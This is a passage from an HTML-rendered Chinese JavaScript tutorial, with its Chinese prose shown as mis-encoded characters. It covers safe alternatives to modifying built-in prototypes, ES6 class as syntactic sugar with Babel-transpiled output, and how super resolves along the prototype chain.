class="hljs-string">&#x27;arrayUniqueMethod&#x27;</span>);<br><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[arrayUniqueMethod] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-variable language_">this</span>)];<br>&#125;;<br><br>[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>][arrayUniqueMethod](); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ¨¡å—åŒ–æ‰©å±•æ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸ä¿®æ”¹åŸå‹ï¼Œæä¾›å·¥å…·å‡½æ•°</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ArrayUtils</span> = &#123;<br>  <span class="hljs-attr">unique</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) &#123;<br>    <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(arr)];<br>  &#125;,<br>  <span class="hljs-attr">shuffle</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨æ–¹å¼</span><br><span class="hljs-title class_">ArrayUtils</span>.<span class="hljs-title function_">unique</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]);<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å­ç±»åŒ–æ›¿ä»£æ–¹æ¡ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-title function_">unique</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-variable language_">this</span>)];<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeArray</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>arr.<span class="hljs-title function_">unique</span>(); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰ä½¿ç”¨ Proxy å°è£…</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createEnhancedArray</span>(<span class="hljs-params">arr</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(arr, &#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>      <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">&#x27;unique&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(target)];<br>      &#125;<br>      <span class="hljs-keyword">return</span> target[prop];<br>    &#125;<br>  &#125;);<br>&#125;<br><br><span class="hljs-keyword">const</span> arr = <span class="hljs-title function_">createEnhancedArray</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]);<br>arr.<span class="hljs-title function_">unique</span>(); <span class="hljs-comment">// [1,2,3]</span><br></code></pre></td></tr></table></figure><p><strong>å†³ç­–æµç¨‹</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">æ˜¯å¦éœ€è¦ä¿®æ”¹å†…ç½®åŸå‹ï¼Ÿ<br>â”œâ”€ æ˜¯ â†’ <br>â”‚  â”œâ”€ æ˜¯å¦ä¸ºæ ‡å‡†Polyfillï¼Ÿ â†’ ä½¿ç”¨Object.definePropertyè§„èŒƒå®ç°<br>â”‚  â”œâ”€ æ˜¯å¦ä¸ºé¡¹ç›®ç‰¹æœ‰éœ€æ±‚ï¼Ÿ â†’ è€ƒè™‘å­ç±»åŒ–æˆ–å·¥å…·å‡½æ•°<br>â”‚  â””â”€ æ˜¯å¦å½±å“ç¬¬ä¸‰æ–¹ä»£ç ï¼Ÿ â†’ å…¨é¢æµ‹è¯•å…¼å®¹æ€§<br>â””â”€ å¦ â†’ <br>   â”œâ”€ ä½¿ç”¨å·¥å…·å‡½æ•°/æ¨¡å—<br>   â”œâ”€ ä½¿ç”¨ç°ä»£è¯­æ³•ç‰¹æ€§<br>   â””â”€ è€ƒè™‘å‡½æ•°ç»„åˆæ¨¡å¼<br></code></pre></td></tr></table></figure><p><strong>æ€»ç»“å»ºè®®</strong></p><ol><li>åŸºæœ¬åŸåˆ™ï¼šæ°¸è¿œä¸è¦ä¿®æ”¹ Object.prototypeï¼›é¿å…ä¿®æ”¹å…¶ä»–å†…ç½®åŸå‹ï¼Œé™¤éç»å¯¹å¿…è¦ï¼›</li><li>å¿…é¡»ä¿®æ”¹æ—¶è¦æœ‰å®‰å…¨æªæ–½</li><li>é•¿æœŸç»´æŠ¤è€ƒé‡ï¼šè®°å½•æ‰€æœ‰å†…ç½®åŸå‹ä¿®æ”¹ï¼›ä¸ºè‡ªå®šä¹‰æ–¹æ³•&#x2F;å±æ€§æ·»åŠ å‰ç¼€ï¼ˆæ¯”å¦‚<code>_myLibUnique</code>ï¼‰ï¼›å®šæœŸæ£€æŸ¥ä¸æœ€æ–° ECMAScript æ ‡å‡†çš„å…¼å®¹æ€§</li><li>å›¢é˜Ÿåä½œè§„èŒƒï¼šä»£ç  review ä¸­ä¸¥æ ¼æ£€æŸ¥åŸå‹ä¿®æ”¹ï¼›ä½¿ç”¨ ESLint è§„åˆ™é™åˆ¶ï¼›é¡¹ç›®æ–‡æ¡£ä¸­æ˜ç¡®è®°å½•æ‰©å±•æ–¹æ³•</li></ol><h1 id="ç¬¬ä¹ç« ï¼šç°ä»£-JavaScript-ä¸­çš„åŸå‹"><a href="#ç¬¬ä¹ç« ï¼šç°ä»£-JavaScript-ä¸­çš„åŸå‹" class="headerlink" title="ç¬¬ä¹ç« ï¼šç°ä»£ JavaScript ä¸­çš„åŸå‹"></a>ç¬¬ä¹ç« ï¼šç°ä»£ JavaScript ä¸­çš„åŸå‹</h1><h2 id="9-1-ES6-class-è¯­æ³•ç³–çš„æœ¬è´¨"><a href="#9-1-ES6-class-è¯­æ³•ç³–çš„æœ¬è´¨" class="headerlink" title="9.1 ES6Â classÂ è¯­æ³•ç³–çš„æœ¬è´¨"></a>9.1 ES6Â <code>class</code>Â è¯­æ³•ç³–çš„æœ¬è´¨</h2><p>class è¯­æ³•å¹¶é ES6 å…¨æ–°å¼•å…¥çš„é¢å‘å¯¹è±¡çš„ç»§æ‰¿æ¨¡å‹ï¼Œè€Œæ˜¯ JavaScript ç°æœ‰çš„åŸå‹ç»§æ‰¿çš„è¯­æ³•ç³–</p><p><strong>ç»“æ„å¯¹æ¯”</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ES5æ„é€ å‡½æ•°å†™æ³•</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// ES6 class å†™æ³•</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>Babel è½¬è¯‘åçš„ä»£ç </strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-meta">&quot;use strict&quot;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-params">instance, Constructor</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Constructor</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&quot;Cannot call a class as a function&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-params">target, props</span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; props.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">var</span> descriptor = props[i];<br>    descriptor.<span class="hljs-property">enumerable</span> = descriptor.<span class="hljs-property">enumerable</span> || <span class="hljs-literal">false</span>;<br>    descriptor.<span class="hljs-property">configurable</span> = <span class="hljs-literal">true</span>;<br>    descriptor.<span class="hljs-property">writable</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, descriptor.<span class="hljs-property">key</span>, descriptor);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_createClass</span>(<span class="hljs-params">Constructor, protoProps, staticProps</span>) &#123;<br>  <span class="hljs-keyword">if</span> (protoProps) <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, protoProps);<br>  <span class="hljs-keyword">if</span> (staticProps) <span class="hljs-title function_">_defineProperties</span>(<span class="hljs-title class_">Constructor</span>, staticProps);<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Constructor</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Person</span> = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title class_">Person</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">_createClass</span>(<span class="hljs-title class_">Person</span>, [&#123;<br>    <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;sayHello&quot;</span>,<br>    <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, &quot;</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>));<br>    &#125;<br>  &#125;]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Person</span>;<br>&#125;();<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒç‰¹æ€§è§£æ</strong></p><p>ï¼ˆ1ï¼‰æ„é€ å‡½æ•°å¯¹åº”å…³ç³»</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;baz&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ç­‰ä»·äº</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;baz&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ–¹æ³•å®šä¹‰æœ¬è´¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-comment">// ç­‰ä»·äº</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰é™æ€æˆå‘˜å®ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-comment">// ç­‰ä»·äº</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property">staticMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰ç»§æ‰¿æœºåˆ¶åŸç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">super</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// è¿‘ä¼¼ç­‰ä»·äº</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<br>&#125;<br><br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;<br></code></pre></td></tr></table></figure><p><strong>æœ¬è´¨ç‰¹æ€§</strong></p><ul><li>åŸå‹ç»§æ‰¿çš„è¯­æ³•ç³–ï¼šæ²¡æœ‰å¼•å…¥æ–°ç»§æ‰¿æ¨¡å‹</li><li>æ›´ä¸¥æ ¼çš„è¯­æ³•ï¼šå¼ºåˆ¶ä½¿ç”¨ newï¼Œé»˜è®¤ä¸¥æ ¼æ¨¡å¼</li><li>æ›´æ¸…æ™°çš„å°è£…ï¼šæ˜ç¡®åŒºåˆ†æ„é€ å‡½æ•°ã€æ–¹æ³•å’Œé™æ€æˆå‘˜</li><li>æ›´å¥½çš„å¯è¯»æ€§ï¼šç±»ä¼¼ä¼ ç»ŸOOPè¯­è¨€çš„è¯­æ³•ç»“æ„</li><li>ä¸å¯æšä¸¾çš„æ–¹æ³•ï¼šé¿å… for-in å¾ªç¯æ±¡æŸ“</li></ul><h2 id="9-2-super-å…³é”®å­—çš„åŸå‹é“¾é€»è¾‘"><a href="#9-2-super-å…³é”®å­—çš„åŸå‹é“¾é€»è¾‘" class="headerlink" title="9.2Â superÂ å…³é”®å­—çš„åŸå‹é“¾é€»è¾‘"></a>9.2Â <code>super</code>Â å…³é”®å­—çš„åŸå‹é“¾é€»è¾‘</h2><p>super æ˜¯ ES6 class ä¸­ç”¨äºè®¿é—®çˆ¶ç±»å†…å®¹çš„å…³é”®å­—</p><p><strong>ä¸¤ç§è°ƒç”¨æ–¹å¼</strong></p><p>ï¼ˆ1ï¼‰ä½œä¸ºå‡½æ•°è°ƒç”¨ï¼ˆä»…åœ¨æ„é€ å‡½æ•°ä¸­ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸå‹é“¾é€»è¾‘å¦‚ä¸‹ï¼š</p><ol><li>åˆ›å»º Child å®ä¾‹æ—¶ï¼Œå…ˆè°ƒç”¨ super() ç›¸å½“äº Parent.call(this)</li><li>ç¡®ä¿ this å…ˆè¢«çˆ¶ç±»åˆå§‹åŒ–</li><li>å»ºç«‹æ­£ç¡®çš„åŸå‹é“¾å…³ç³»ï¼š<code>ChildInstance.__proto__</code> â†’ <code>Child.prototype.__proto__</code> â†’ <code>Parent.prototype</code></li></ol><p>ï¼ˆ2ï¼‰ä½œä¸ºå¯¹è±¡å¼•ç”¨ï¼ˆåœ¨æ–¹æ³•ä¸­ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello from Parent&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHello</span>() + <span class="hljs-string">&#x27; and Child&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸå‹é“¾é€»è¾‘å¦‚ä¸‹ï¼š</p><ol><li>super æŒ‡å‘çˆ¶ç±»åŸå‹ï¼šsuper &#x3D; Object.getPrototypeOf(Child.prototype)</li><li>æ–¹æ³•è°ƒç”¨æ—¶ this ä»æŒ‡å‘å½“å‰å®ä¾‹</li><li>ç›¸å½“äº Parent.prototype.sayHello.call(this)</li></ol><p><strong>åŸå‹é“¾æŸ¥æ‰¾æœºåˆ¶</strong></p><p>ï¼ˆ1ï¼‰æ–¹æ³•ä¸­çš„ super æŸ¥æ‰¾è·¯å¾„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">A</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">method</span>(); &#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">B</span> &#123; <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">method</span>(); &#125; &#125;<br><br><span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title function_">C</span>();<br>c.<span class="hljs-title function_">method</span>();<br></code></pre></td></tr></table></figure><p>å…¶æŸ¥æ‰¾è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>C.prototype.method ä¸­çš„ super â†’ B.prototype</li><li>B.prototype.method ä¸­çš„ super â†’ A.prototype</li><li>æœ€ç»ˆè°ƒç”¨ A.prototype.method</li></ol><p>ï¼ˆ2ï¼‰é™æ€æ–¹æ³•ä¸­çš„ super</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Parent static&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">staticMethod</span>() + <span class="hljs-string">&#x27; + Child static&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶æŸ¥æ‰¾é€»è¾‘ï¼š</p><ol><li>super æŒ‡å‘çˆ¶ç±»æœ¬èº«ï¼šsuper &#x3D; Object.getPrototypeOf(Child)</li><li>ç›¸å½“äº Parent.staticMethod.call(this)</li></ol><p><strong>åº•å±‚å®ç°åŸç†</strong></p><p>ï¼ˆ1ï¼‰Babel è½¬è¯‘åçš„ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">parentMethod</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// è½¬è¯‘ä¸º</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Child</span> = (<span class="hljs-keyword">function</span>(<span class="hljs-params">_Parent</span>) &#123;<br>  <span class="hljs-title function_">_inherits</span>(<span class="hljs-title class_">Child</span>, _Parent);<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">_classCallCheck</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title class_">Child</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_possibleConstructorReturn</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-title class_">Child</span>).<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>));<br>  &#125;<br><br>  <span class="hljs-title function_">_createClass</span>(<span class="hljs-title class_">Child</span>, [&#123;<br>    <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;method&quot;</span>,<br>    <span class="hljs-attr">value</span>: <span class="hljs-keyword">function</span> <span 